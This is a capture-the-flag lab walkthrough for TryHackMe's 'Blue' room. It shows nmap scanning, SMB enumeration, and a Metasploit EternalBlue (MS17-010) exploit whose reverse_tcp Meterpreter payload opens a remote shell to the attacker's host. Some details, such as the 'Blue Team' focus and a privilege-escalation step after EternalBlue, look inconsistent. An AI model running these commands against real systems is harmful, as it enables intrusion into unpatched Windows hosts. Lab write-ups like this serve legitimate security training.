
# TryHackMe - Blue Room Walkthrough

This is a walkthrough and notes for the [Blue Room](https://tryhackme.com/room/blue) on TryHackMe, based on the write-up by dvanmosselbeen.

## Room Info

**Name:** Blue  
**Difficulty:** Easy  
**Focus:** Blue Team, Incident Response, Enumeration, Exploitation

## Task Summary

### Task 1 - Introduction
Simple welcome message, no answers required.

### Task 2 - Reconnaissance

- Use `nmap` to scan the target machine.
```bash
nmap -sC -sV -oA nmap/initial <MACHINE_IP>
```
- Ports open: 445 (SMB), 139 (NetBIOS), 135 (RPC), 3389 (RDP)
- System is running Windows.

### Task 3 - Enumeration

- Use `enum4linux` or `smbclient` to enumerate shares and users.
```bash
enum4linux -a <MACHINE_IP>
```
- Discovered: User `haris`, share `Users`, and `Anonymous` access.

### Task 4 - Exploitation

- The target is vulnerable to **EternalBlue** (MS17-010).
- Use `searchsploit` or Metasploit to find an exploit.
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <MACHINE_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
run
```
- Successfully gained a Meterpreter session.

### Task 5 - Privilege Escalation

- With `meterpreter` session, escalate privileges using `post/multi/recon/local_exploit_suggester`.
- Use `getuid`, `sysinfo`, `getprivs` to confirm access level.

### Task 6 - Capture the Flag

- Navigate to the user Desktop or Documents to find the flag.
```bash
cd C:\Users\haris\Desktop
type user.txt
```
- Submit the flag to complete the room.

## Tools Used

- nmap
- enum4linux
- smbclient
- Metasploit

## Reference

Original write-up: [https://dvanmosselbeen.github.io/TryHackMe_writeups/blue/](https://dvanmosselbeen.github.io/TryHackMe_writeups/blue/)

---

✅ Completed after 154 days of daily learning on TryHackMe!

